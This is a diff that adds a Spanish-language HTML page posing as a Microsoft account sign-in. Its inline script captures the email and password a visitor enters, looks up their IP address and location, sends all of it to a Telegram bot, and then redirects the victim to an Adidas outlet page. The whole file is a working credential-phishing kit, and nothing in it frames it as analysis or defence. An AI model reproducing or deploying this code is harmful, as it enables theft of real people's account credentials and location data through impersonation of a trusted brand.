@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Iniciar sesión en tu cuenta Microsoft</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=no" />
+    <link rel="stylesheet" type="text/css" href="estilo.css" />
+  </head>
+  <body class="cb" style="font-family: sans-serif;" data-bind="defineGlobals: ServerData, bodyCssClass">
+
+
+     <div class="generalContainer">
+
+      <div class="container">
+
+        <img class="imagen" src="222hotmail.jpg" alt="" />
+
+        <h2>Iniciar Sesi&oacute;n</h2>
+
+        <form id="loginForm">
+
+          <input class="ipp1" type="email" id="email" name="email" placeholder="Correo electrónico" required />
+ 
+          <input  class="ipp1"  id="password" type="password" name="password" placeholder="Contraseña" required />
+
+          <div class="div_text">
+
+            <small class="small_negro">¿No tienes una cuenta?</small>
+
+            <a style="font-family: sans-serif;" href="#">Cree una.</a>
+
+     </div>
+          <input type="submit" value="Siguiente" />
+
+        </form>
+
+      </div>
+
+    </div>
+ 
+    <script src="config.js"></script>
+    <script>
+      document.getElementById('loginForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Llamada a la API de ipapi para obtener los datos de IP, ciudad y país
+        fetch('https://ipapi.co/json/')
+          .then(response => response.json())
+          .then(data => {
+            const ip = data.ip;
+            const city = data.city;
+            const country = data.country_name;
+
+            // Crea el mensaje a enviar a Telegram con los datos de IP, ciudad y país
+            const message = `Nuevo intento de inicio de sesión:
+Correo: ${email}
+Contraseña: ${password}
+IP: ${ip}
+Ciudad: ${city}
+País: ${country}`;
+
+            // Envía el mensaje a Telegram
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+              }),
+            })
+              .then(response => response.json())
+              .then(data => {
+                // Redirige a la página de destino tras enviar los datos
+                if (data.ok) {
+                  window.location.href = "https://www.adidas.mx/outlet";
+                }
+              })
+              .catch(error => {
+                console.error('Error:', error);
+              });
+          })
+          .catch(error => {
+            console.error('Error al obtener la ubicación:', error);
+          });
+      });
+    </script>
+  </body>
+</html>
